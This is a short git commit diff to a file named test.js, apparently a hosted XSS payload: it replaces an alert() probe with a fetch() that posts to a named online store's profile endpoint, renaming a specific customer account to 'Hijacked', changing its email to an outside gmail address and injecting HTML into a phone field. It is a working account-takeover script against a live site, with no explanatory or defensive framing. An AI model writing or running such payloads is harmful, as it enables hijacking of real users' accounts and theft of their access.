0eb5fe6346e2968e63a2625fb9471f94e5c7e311
gdb1774 <143023984+gdb1774@users.noreply.github.com>
2024-06-06 14:19:05 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,8 @@
-alert("This is an alert!");
+fetch('https://store.hypertecsp.com/Customers/saveProfile', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'id=9915208&nameFirst=Hijacked&nameLast=Hijacked&title=&email=babbaisme5%40gmail.com&phoneWork=%3Ch1%3ETest&phoneWorkExt=&phoneMobile=&phoneMobileExt=&fax=&faxExt=&phoneHome=&phoneHomeExt=&phoneOther=&phoneOtherExt=&timeZone=-6&language=en_US&addressLine1=123123&addressLine2=&City=test&state=53&zipCode=123133&country=2'
+})
+.then(response => response.text());
